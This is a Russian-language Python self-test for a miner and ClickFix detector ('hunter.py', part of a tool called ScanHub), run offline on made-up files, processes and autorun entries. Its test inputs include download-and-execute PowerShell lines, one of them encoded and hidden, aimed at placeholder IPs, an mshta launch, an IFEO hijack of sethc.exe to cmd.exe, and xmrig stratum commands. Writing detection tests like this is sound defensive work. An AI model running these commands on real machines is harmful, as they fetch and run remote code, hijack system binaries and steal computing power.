"""Самопроверка «Охотника» (hunter.py) — полностью офлайн и на выдуманных данных.

Настоящих вредоносов нет: «майнер» — это маленький файл с заголовком MZ и строками, какие бывают внутри майнеров.
Всё создаётся во временной папке и удаляется. Систему не трогаем: чистые функции получают словари, а «Охотнику»
подменяются папки пользователя, своя папка, проверка подписей и файл кэша.

Запуск:  python -X utf8 dev\\hunter_selftest.py
"""
import os
import shutil
import sys
import tempfile

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT_DIR)
import hunter as H  # noqa: E402

OK, FAIL = [], []
WIN = os.environ.get("SystemRoot", r"C:\Windows")
XMR = "4" + "A" + "9" * 93                                   # выдуманный «кошелёк» по форме Monero (95 знаков)


def check(name, cond, detail=""):
    (OK if cond else FAIL).append(name)
    print(("  ok   " if cond else "  FAIL ") + name + (f"  → {detail}" if detail and not cond else ""))


def level(codes):
    return H.evaluate(codes)[1]


def codes(sigs):
    return {c for c, _ in sigs}


def lvl_of(found, part):
    f = next((f for f in found if part.lower() in (f["path"] + " " + f["title"] + " " + " ".join(f["evidence"])).lower()), None)
    return f["level"] if f else None


# ------------------------------------------------------------------ 1. веса и правила
print("1. Веса и правила")
check("каждый отпечаток содержит якорь", all(any(a in n for a in H.ANCHORS) for n, _ in H.NEEDLES))
check("у каждой улики есть вес, роль и текст", all(len(v) == 4 and v[1] in ("core", "mod", "neg", "decisive") and v[3] for v in H.W.values()))
for weak in ("UNSIGNED", "USER_DIR", "POOL_PORT", "RUNNING", "UPX", "L_HIDDEN", "B_NO_IO", "B_SINGLE_REMOTE", "B_LOCK_PAGES"):
    check(f"одна слабая улика {weak} — не находка", level([weak]) is None)
check("все слабые улики вместе — не находка", level(["UNSIGNED", "USER_DIR", "POOL_PORT", "RUNNING", "UPX", "AUTORUN"]) is None)
check("порт пула + запущен + без подписи — не находка", level(["POOL_PORT", "RUNNING", "UNSIGNED"]) is None)
check("слабое упоминание майнинга не дотягивает до угрозы даже со всеми усилителями",
      level(["FP_WEAK", "RUNNING", "USER_DIR", "UNSIGNED", "UPX", "AUTORUN", "VI_MISMATCH"]) != "threat")
check("код майнера + запущен + папка пользователя = угроза", level(["FP_STRONG", "RUNNING", "USER_DIR"]) == "threat")
check("код майнера лежит без дела = подозрительно, не угроза", level(["FP_STRONG", "USER_DIR", "UNSIGNED", "NEAR_KIT"]) == "suspicious")
check("stratum в команде запущенной программы = угроза", level(["CMD_STRATUM"]) == "threat")
check("подписанный майнер (NiceHash) = подозрительно", level(["FP_STRONG", "RUNNING", "USER_DIR", "SIG_VALID"]) == "suspicious")
check("доверенная подпись + код майнера = только «к сведению»", level(["FP_STRONG", "RUNNING", "SIG_TRUSTED"]) == "info")

# ------------------------------------------------------------------ 2. команды майнеров
print("2. Команды запуска")
c = H.cmd_signals(f'C:\\Users\\u\\AppData\\Roaming\\svc.exe -o stratum+tcp://pool.supportxmr.com:3333 -u {XMR} --donate-level 1 -a rx/0 --rig-id pc --background')
check("xmrig: stratum, кошелёк, donate-level, алгоритм", {"CMD_STRATUM", "CMD_WALLET", "CMD_DONATE", "CMD_ALGO"} <= codes(c), str(c))
check("xmrig-команда = угроза", level(codes(c)) == "threat")
c = H.cmd_signals("helper.exe -o xmr.pool.example:4444 -u worker1 -p x --cpu-max-threads-hint 50 --randomx-1gb-pages")
check("пул без stratum + настройки майнера: улики есть, но не «решающие»", "CMD_POOL" in codes(c) and "CMD_STRATUM" not in codes(c), str(c))
for benign in ('gcc -o main.exe main.c -a', 'ffmpeg -i in.mp4 -a 1 -o out.mp4', 'curl -u user:pass -o file.zip https://example.com/a.zip',
               '"C:\\Program Files\\Git\\cmd\\git.exe" push -u origin main', 'node server.js --port 4444 --pass secret',
               'python -m http.server 7777', 'app.exe --opencl'):
    check(f"обычная команда чиста: {benign[:38]}", not H.cmd_signals(benign), str(H.cmd_signals(benign)))

# ------------------------------------------------------------------ 3. подделка имени
print("3. Подделка под системные программы")
check("svchost.exe в System32 — норма", not H.masquerade_signals("svchost.exe", WIN + r"\System32\svchost.exe"))
check("explorer.exe в Windows — норма", not H.masquerade_signals("explorer.exe", WIN + r"\explorer.exe"))
check("svchost.exe во временной папке — подделка", codes(H.masquerade_signals("svchost.exe", r"C:\Users\u\AppData\Local\Temp\svchost.exe")) == {"MASQ_PATH"})
for fake in ("svch0st.exe", "scvhost.exe", "expl0rer.exe", "lsas.exe", "csrsss.exe", "dllhsot.exe"):
    check(f"похожее имя {fake}", codes(H.masquerade_signals(fake, "C:\\Users\\u\\AppData\\Roaming\\" + fake)) == {"MASQ_LOOKALIKE"})
for fine in ("service.exe", "chrome.exe", "python.exe", "node.exe", "Code.exe", "host.exe", "steam.exe", "explorer++.exe"):
    check(f"обычное имя {fine}", not H.masquerade_signals(fine, "C:\\Users\\u\\AppData\\Local\\App\\" + fine))
check("подделка + без подписи + папка пользователя + запущена = угроза", level(["MASQ_PATH", "UNSIGNED", "USER_DIR", "RUNNING"]) == "threat")
check("только похожее имя = не угроза", level(["MASQ_LOOKALIKE", "USER_DIR", "UNSIGNED"]) == "suspicious")

# ------------------------------------------------------------------ 4. своё не трогаем
print("4. Собственные задачи ScanHub")
own = [r"D:\ScanHub", r"C:\Program Files\ScanHub", r"C:\ProgramData\ScanHub"]
check("задача Sensors", H.is_own('"conhost.exe" --headless powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\\Program Files\\ScanHub\\sensors.ps1"', r"C:\WINDOWS\system32\conhost.exe", own))
check("задача MemClean", H.is_own('conhost.exe --headless powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\\Program Files\\ScanHub\\memclean.ps1"', "", own))
check("процесс powershell с нашим скриптом", H.is_own('powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\\Program Files\\ScanHub\\sensors.ps1"', r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", own))
check("задача «Сторож»", H.is_own('"C:\\Users\\u\\AppData\\Local\\Programs\\Python\\Python314\\pythonw.exe" "D:\\ScanHub\\scanhub.py" --watch-once', r"C:\Users\u\AppData\Local\Programs\Python\Python314\pythonw.exe", own))
check("файл из папки ScanHub (сторонний сканер)", H.is_own("", r"D:\ScanHub\apps\minersearch\MinerSearch.exe", own))
check("та же форма, но чужой скрипт — НЕ своё", not H.is_own('conhost.exe --headless powershell.exe -NoProfile -File "C:\\Users\\Public\\sensors.ps1"', "", own))
check("имя ScanHub в чужой папке — НЕ своё", not H.is_own('"C:\\Users\\u\\AppData\\Roaming\\ScanHub\\ScanHub.exe"', r"C:\Users\u\AppData\Roaming\ScanHub\ScanHub.exe", own))
check("наш путь, но с зашифрованной командой — НЕ своё",
      not H.is_own('conhost.exe --headless powershell.exe -enc ' + "QQBCAEMARABFAEYARwBIAEkASgBLAEwATQBOAE8AUABRAFIAUwBUAA==" + ' -File "C:\\Program Files\\ScanHub\\sensors.ps1"', "", own))

# ------------------------------------------------------------------ 5. ClickFix и приватность
print("5. Следы ClickFix и стилеров")
cf = 'powershell -w hidden -c "irm http://185.10.20.30/v.ps1 | iex" # ✅ I am not a robot - reCAPTCHA Verification ID: 4481'
check("Win+R: скачать|iex + «я не робот» = угроза", level(codes(H.clickfix_signals(cf, "runmru"))) == "threat", str(H.clickfix_signals(cf, "runmru")))
check("Win+R: mshta с адресом = угроза", level(codes(H.clickfix_signals("mshta https://bad.example/a.hta", "runmru"))) == "threat")
check("история: irm неизвестный сайт | iex = к сведению", level(codes(H.clickfix_signals("irm https://some-site.example/i.ps1 | iex", "history"))) == "info")
for good in ("irm get.scoop.sh | iex", "irm https://claude.ai/install.ps1 | iex", "iwr -useb https://christitus.com/win | iex",
             'powershell -c "irm https://astral.sh/uv/install.ps1 | iex"'):
    check(f"история: известный установщик — не находка ({good[:30]})", level(codes(H.clickfix_signals(good, "history"))) is None)
for plain in ("cmd", "notepad", "regedit", "ipconfig /all", "git status", "pip install requests", "cd D:\\ScanHub", "winget install Git.Git"):
    check(f"обычная команда: {plain}", not H.clickfix_signals(plain, "runmru"))
m = H.mask_secrets("curl -H 'Authorization: Bearer abcdEFGH1234567890abcdEFGH1234567890' https://x.example/?token=SuperSecret123 -p password=hunter2hunter2 " + "z" * 300)
check("пароли и ключи спрятаны", "SuperSecret123" not in m and "hunter2hunter2" not in m and "abcdEFGH1234567890abcd" not in m, m)
check("команда обрезана до 160 знаков", len(m) <= 160)

# ------------------------------------------------------------------ 6. скрипты, конфиги, автозагрузка
print("6. Скрипты, настройки майнера, автозагрузка")
bat = f"@echo off\r\nstart /min svc.exe -o stratum+tcp://xmr.pool.example:3333 -u {XMR} -p x --donate-level 1\r\n"
check(".bat со stratum, кошельком и скрытым окном = угроза", level(codes(H.script_signals(bat))) == "threat", str(H.script_signals(bat)))
check(".bat только со stratum = подозрительно", level(codes(H.script_signals("miner.exe -o stratum+tcp://a.example:3333"))) == "suspicious")
check("обычный .bat чист", not H.script_signals("@echo off\r\ncd /d %~dp0\r\npython app.py --port 8080\r\npause"))
cfg = '{"autosave": true, "cpu": {"enabled": true}, "donate-level": 1, "randomx": {"mode": "auto"}, "pools": [{"url": "pool.supportxmr.com:3333", "user": "%s", "pass": "x"}]}' % XMR
check("config.json майнера распознан", codes(H.config_signals(cfg)) == {"CFG_MINER", "CFG_WALLET"})
check("конфиг майнера без дела = подозрительно", level(codes(H.config_signals(cfg))) == "suspicious")
check("обычный JSON чист", not H.config_signals('{"name": "app", "pools": 3, "version": "1.0"}') and not H.config_signals('{"cpu": 4, "theme": "dark"}'))
sig, _, lol = H.autorun_signals({"kind": "Перехват запуска", "where": "IFEO", "name": "sethc.exe", "cmd": WIN + r"\System32\cmd.exe", "exe": WIN + r"\System32\cmd.exe"})
check("IFEO: sethc.exe → cmd.exe = угроза", level(codes(sig) | {"AUTORUN"}) == "threat" and lol, str(sig))
sig, _, _ = H.autorun_signals({"kind": "Перехват запуска", "where": "IFEO", "name": "taskmgr.exe", "cmd": r'"C:\Tools\procexp64.exe" /e', "exe": r"C:\Tools\procexp64.exe"})
check("IFEO: Process Explorer вместо Диспетчера задач — без «перехвата защиты»", "P_IFEO_SEC" not in codes(sig))
enc = __import__("base64").b64encode("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')".encode("utf-16le")).decode()
sig, _, _ = H.autorun_signals({"kind": "Задача", "where": "\\", "name": "Updater", "cmd": f"powershell.exe -w hidden -enc {enc}", "exe": WIN + r"\System32\WindowsPowerShell\v1.0\powershell.exe"})
check("задача: скрытый powershell с зашифрованной загрузкой = угроза", level(codes(sig) | {"AUTORUN"}) == "threat", str(sig))
sig, _, _ = H.autorun_signals({"kind": "Реестр", "where": "HKCU\\Run", "name": "Discord", "cmd": r'"C:\Users\u\AppData\Local\Discord\Update.exe" --processStart Discord.exe', "exe": r"C:\Users\u\AppData\Local\Discord\Update.exe"})
check("обычный автозапуск из AppData — улик нет", not sig, str(sig))

# ------------------------------------------------------------------ 7. «физика майнера»
print("7. Поведение («физика майнера»)")
flat = [62.0, 62.5, 61.8, 62.2, 62.1, 61.9, 62.4, 62.0, 62.3, 61.7]
packed = {"cpu": flat, "ncpu": 16, "hidden": True, "private_mb": 2340, "threads": 14, "io_bps": 900, "remotes": 1, "remote": "203.0.113.5:443",
          "lock_pages": True, "gpu": None}
ps = codes(H.physics_signals(packed))
check("упакованный майнер без единой строки: все поведенческие улики", {"B_FLAT_LOAD", "B_RANDOMX_MEM", "B_NO_IO", "B_SINGLE_REMOTE", "B_LOCK_PAGES", "B_BUSY_THREADS"} <= ps, str(ps))
check("…в папке пользователя и без подписи = угроза", level(ps | {"RUNNING", "USER_DIR", "UNSIGNED"}) == "threat")
check("…с доверенной подписью (локальная нейросеть, рендер) — не угроза", level(ps | {"RUNNING", "SIG_TRUSTED"}) != "threat")
check("…в системном процессе: нужны улики сильнее (не угроза без подмены)", level((ps - {"B_LOCK_PAGES"}) | {"RUNNING", "SYS_BIN"}) != "threat")
check("то же, но с видимым окном (игра, рендер) — ничего", not H.physics_signals({**packed, "hidden": False}))
check("ровная нагрузка сама по себе — не находка", level(codes(H.physics_signals({"cpu": flat, "ncpu": 16, "hidden": True, "private_mb": 300, "threads": 60, "io_bps": 5e6, "remotes": 4}))) is None)
jumpy = [5, 80, 20, 95, 10, 60, 30, 90, 15, 70]
check("скачущая нагрузка (сборка, антивирус) — ничего", not H.physics_signals({"cpu": jumpy, "ncpu": 16, "hidden": True, "private_mb": 800, "threads": 30, "io_bps": 2e7, "remotes": 0}))
check("слабая нагрузка — ничего", not H.physics_signals({"cpu": [1.0] * 10, "ncpu": 16, "hidden": True, "private_mb": 2300, "threads": 10, "io_bps": 0, "remotes": 1}))
gpu = codes(H.physics_signals({"cpu": [2.0] * 10, "ncpu": 16, "hidden": True, "private_mb": 900, "threads": 12, "io_bps": 100, "remotes": 1, "gpu": 97}))
check("скрытая нагрузка на видеокарту", "B_GPU_HIDDEN" in gpu and level(gpu | {"RUNNING", "USER_DIR", "UNSIGNED"}) == "suspicious", str(gpu))
check("затихает при Диспетчере задач и возвращается", H.observer_shy([60, 61, 59, 60, 62], [1, 0, 0.5, 0], [58, 60, 61, 59]))
check("нагрузка не изменилась — не «скрытный»", not H.observer_shy([60, 61, 59, 60, 62], [59, 60, 61, 60], [58, 60, 61, 59]))
check("упала и не вернулась (просто закончил работу) — не «скрытный»", not H.observer_shy([60, 61, 59, 60, 62], [1, 0, 0, 0], [0, 1, 0, 0]))
check("нестабильная нагрузка до опыта — не судим", not H.observer_shy([5, 90, 2, 80, 10], [1, 0, 0, 0], [60, 60, 60, 60]))
check("«скрытный» + ровная нагрузка + папка пользователя = угроза", level({"B_OBSERVER_SHY", "B_FLAT_LOAD", "RUNNING", "USER_DIR"}) == "threat")
check("грузит только когда человек отошёл", H.idle_correlation([(600, 55), (900, 60), (300, 58), (5, 2), (10, 0), (1, 3)]))
check("грузит всегда — не корреляция", not H.idle_correlation([(600, 55), (900, 60), (300, 58), (5, 50), (10, 61), (1, 57)]))
check("мало наблюдений — не судим", not H.idle_correlation([(600, 55), (5, 2)]))
check("WinRing0 во временной папке", H.winring0_suspicious(r"\??\C:\Users\u\AppData\Local\Temp\WinRing0x64.sys", [r"c:\users\u\appdata\local\temp"]))
check("WinRing0 в папке программы для железа — норма", not H.winring0_suspicious(r"C:\Program Files\HWiNFO64\WinRing0x64.sys", [r"c:\users\u\appdata\local\temp"]))
info = {1: {"ppid": 0, "name": "explorer.exe", "exe": WIN + r"\explorer.exe"}, 10: {"ppid": 1, "name": "cmd.exe", "exe": "c"},
        11: {"ppid": 10, "name": "conhost.exe", "exe": "h"}, 12: {"ppid": 10, "name": "xmrig.exe", "exe": "x"},
        20: {"ppid": 1, "name": "upd.exe", "exe": "u"}, 30: {"ppid": 1, "name": "game.exe", "exe": "g"}, 31: {"ppid": 30, "name": "worker.exe", "exe": "w"}}
check("майнер в видимой консоли — не скрытый", not H.is_hidden(12, {1, 11, 30}, info))
check("процесс без окна от проводника — скрытый", H.is_hidden(20, {1, 11, 30}, info))
check("помощник программы с окном — не скрытый", not H.is_hidden(31, {1, 11, 30}, info))

# ------------------------------------------------------------------ 8. настоящие файлы во временной папке
print("8. Файлы на диске (выдуманные)")
tmp = tempfile.mkdtemp(prefix="hunter_selftest_")
try:
    MINER = (b"MZ\x90\x00" + b"\0" * 200 + b"XMRig 6.21.0\0donate.v2.xmrig.com\0--donate-level\0randomx\0cryptonight\0"
             b"stratum+tcp://\0mining.subscribe\0" + "OriginalFilename".encode("utf-16le") + b"\0\0" + "xmrig.exe".encode("utf-16le") + b"\0\0" + b"\x11" * 5000)
    PLAIN = b"MZ\x90\x00" + b"\0" * 200 + b"Hello world, ordinary program. GetHash SetHash RandomXy" + b"\x22" * 5000

    def put(rel, data):
        path = os.path.join(tmp, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "wb") as f:
            f.write(data if isinstance(data, bytes) else data.encode("utf-8"))
        return path

    fake_svchost = put(r"Roaming\WinUpdate\svchost.exe", MINER)
    kit_exe = put(r"Local\helper\helper.exe", MINER)
    put(r"Local\helper\config.json", cfg)
    put(r"Local\helper\start.cmd", "helper.exe --config=config.json -o stratum+tcp://a.example:3333\r\n")
    lone_bat = put(r"Roaming\run\start.bat", bat)
    plain = put(r"Local\Programs\Tool\tool.exe", PLAIN)
    plain2 = put(r"Local\Programs\Tool2\tool2.exe", PLAIN)
    signed_nv = put(r"Local\NV\nvhelper.exe", MINER)
    signed_nh = put(r"Local\NiceHash\nhm.exe", MINER)
    signed_av = put(r"Local\AV\mbam.exe", MINER)
    python = put(r"Local\Programs\Python\python.exe", PLAIN)
    auto_miner = put(r"Roaming\Updater\updater.exe", MINER)
    run_miner = put(r"Roaming\Sys\syshost.exe", PLAIN)                 # «упакован»: строк нет, выдаёт только команда
    ownroot = os.path.join(tmp, "ScanHubOwn")
    put(r"ScanHubOwn\apps\minersearch\MinerSearch.exe", MINER)          # свой сканер майнеров: внутри те же строки
    put(r"ScanHubOwn\data\yara\miners.bat", bat)
    put(r"Local\node_modules\x\cli.exe", MINER)                         # служебные папки не обходим

    SIGS = {"nvhelper.exe": ("Valid", "NVIDIA Corporation"), "nhm.exe": ("Valid", "H-BIT, d.o.o."), "mbam.exe": ("Valid", "Malwarebytes Inc."),
            "python.exe": ("Valid", "Python Software Foundation")}

    def sign(paths):
        return {p: dict(zip(("status", "signer"), SIGS.get(os.path.basename(p).lower(), ("NotSigned", "")))) for p in paths}

    def hunter():
        return H.Hunter("deep", emit=lambda *_: None, user_dirs=[tmp], own_roots=[ownroot], sign=sign, cache_file=os.path.join(tmp, "cache.json"))

    fp = H.fingerprint_file(fake_svchost)
    check("отпечаток: сильный, настоящее имя xmrig.exe", fp and fp["pts"] >= 5 and fp["orig"] == "xmrig.exe" and fp["mz"], str(fp))
    check("отпечаток: обычный файл чист («GetHash» не считается)", H.fingerprint_file(plain)["pts"] == 0)
    check("настоящее имя не совпадает с именем на диске", "VI_MISMATCH" in codes(H.fp_signals(fp, fake_svchost)))

    h = hunter()
    st = h.scan_tree([tmp], 30, 6)
    h.run_fp_queue(30)
    # процессы и автозагрузка — словарями
    h.add_process({"pid": 4242, "ppid": 1, "name": "syshost.exe", "exe": run_miner, "parent": "explorer.exe",
                   "cmd": f'"{run_miner}" -o stratum+ssl://pool.example:443 -u {XMR} --donate-level 0'})
    h.add_process({"pid": 4243, "ppid": 1, "name": "python.exe", "exe": python, "cmd": f'"{python}" app.py --port 8080', "parent": "Code.exe"})
    h.add_process({"pid": 4244, "ppid": 1, "name": "svchost.exe", "exe": WIN + r"\System32\svchost.exe", "cmd": WIN + r"\System32\svchost.exe", "parent": "explorer.exe"})
    h.add_process({"pid": 4245, "ppid": 1, "name": "svchost.exe", "exe": WIN + r"\System32\svchost.exe", "cmd": WIN + r"\System32\svchost.exe -k netsvcs -p", "parent": "services.exe"})
    r_own = h.add_process({"pid": 4246, "ppid": 1, "name": "powershell.exe", "exe": WIN + r"\System32\WindowsPowerShell\v1.0\powershell.exe",
                           "cmd": f'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "{ownroot}\\sensors.ps1"', "parent": "conhost.exe"})
    h.add_autorun({"kind": "Реестр", "where": "HKCU\\Run", "name": "Updater", "cmd": f'"{auto_miner}" --silent', "exe": auto_miner})
    h.add_autorun({"kind": "Реестр", "where": "HKCU\\Run", "name": "Tool", "cmd": f'"{plain}"', "exe": plain, "sig": {"status": "NotSigned", "signer": ""}})
    a_own = h.add_autorun({"kind": "Задача", "where": "\\ScanHub\\", "name": "Sensors",
                           "cmd": f'"conhost.exe" --headless powershell.exe -NoProfile -ExecutionPolicy Bypass -File "{ownroot}\\sensors.ps1"',
                           "exe": WIN + r"\system32\conhost.exe"})
    secret = "irm http://45.9.8.7/x.ps1?token=TopSecretValue42 | iex  # ✅ I am not a robot"
    h.add_trace(secret, "runmru", "17.11.2026")
    h.add_trace("irm get.scoop.sh | iex", "history", "не позже 17.11.2026")
    h.run_fp_queue(30)
    found = h.findings()
    h.save_cache()

    check("обход: служебные папки и своя папка пропущены", st["exes"] == 9, str(st))
    check("автозапуск неподписанной программы из временной папки = подозрительно, не угроза", lvl_of(found, plain) == "suspicious")
    check("поддельный svchost.exe с кодом майнера = угроза (майнер)", lvl_of(found, fake_svchost) == "threat" and
          next(f for f in found if f["path"].lower() == fake_svchost.lower())["category"] == "miner")
    kit = [f for f in found if os.path.dirname(f["path"]).lower() == os.path.dirname(kit_exe).lower()]
    check("набор майнера (exe + config + start.cmd) = одна находка, подозрительно", len(kit) == 1 and kit[0]["level"] == "suspicious"
          and any("NEAR_KIT" in e for e in kit[0]["evidence"]), str([(f["path"], f["level"]) for f in kit]))
    check("одинокий start.bat со stratum и скрытым окном = угроза", lvl_of(found, lone_bat) == "threat")
    check("обычная программа без подписи в папке пользователя — не находка", lvl_of(found, plain2) is None)
    check("python в папке пользователя — не находка", lvl_of(found, python) is None)
    check("подпись NVIDIA + код майнера — только «к сведению»", lvl_of(found, signed_nv) == "info")
    check("подпись майнинговой фирмы — подозрительно («если ставил сам — в порядке»)", lvl_of(found, signed_nh) == "suspicious")
    check("подпись антивируса — не находка", lvl_of(found, signed_av) is None)
    check("автозапуск файла с кодом майнера = угроза", lvl_of(found, auto_miner) == "threat")
    fa = next(f for f in found if f["path"].lower() == auto_miner.lower())
    check("…с действиями «отключить автозапуск» и «карантин»", {"disable_autorun", "quarantine", "online_check", "open_folder"} <= {a["kind"] for a in fa["actions"]})
    fr = next((f for f in found if f["path"].lower() == run_miner.lower()), None)
    check("запущенный «упакованный» майнер со stratum в команде = угроза", fr and fr["level"] == "threat" and fr["pid"] == 4242)
    check("…с действием «остановить процесс»", fr and any(a["kind"] == "kill" and a["target"] == 4242 for a in fr["actions"]))
    check("кошелёк в уликах сокращён", fr and XMR not in " ".join(fr["evidence"]))
    check("svchost без -k = подозрительно", lvl_of(found, "L_SVCHOST_NOK") in ("suspicious", "threat") and sum("L_SVCHOST_NOK" in " ".join(f["evidence"]) for f in found) == 1)
    check("свои задача и процесс ScanHub не попали в находки", r_own is None and a_own is None and not any("sensors.ps1" in " ".join(f["evidence"]) for f in found))
    check("свой MinerSearch и правила YARA не попали в находки", not any("scanhubown" in f["path"].lower() for f in found))
    tr = next((f for f in found if f["category"] == "clickfix"), None)
    check("след ClickFix в Win+R = угроза", tr and tr["level"] == "threat", str(tr))
    check("…без секретов в тексте находки", tr and "TopSecretValue42" not in H.explain(tr))
    check("установщик scoop из истории — не находка", sum(f["category"] == "clickfix" for f in found) == 1)
    need = {"id", "level", "score", "category", "title", "why", "evidence", "path", "pid", "actions"}
    check("у находок все поля и понятный текст", all(need <= set(f) and f["why"] and f["title"] and len(f["id"]) == 12 for f in found))
    check("номера находок не повторяются и стабильны", len({f["id"] for f in found}) == len(found) and
          fa["id"] == H.finding_id("miner", "f:" + auto_miner.lower()))
    check("угрозы идут первыми", [H.LEVEL_ORDER[f["level"]] for f in found] == sorted(H.LEVEL_ORDER[f["level"]] for f in found))

    h2 = hunter()
    h2.scan_tree([tmp], 30, 6)
    h2.run_fp_queue(30)
    check("повторная проверка берёт отпечатки из кэша", h2.stats.get("fp_cached", 0) >= 9 and not h2.stats.get("fp_read"), str(h2.stats))

    stop = hunter()
    stop.stopped = lambda: True
    check("остановка: обход прекращается сразу", stop.scan_tree([tmp], 30, 6)["partial"])
finally:
    shutil.rmtree(tmp, ignore_errors=True)

print()
print(f"ИТОГ: пройдено {len(OK)}, провалено {len(FAIL)}")
for f in FAIL:
    print("  ✗", f)
sys.exit(1 if FAIL else 0)
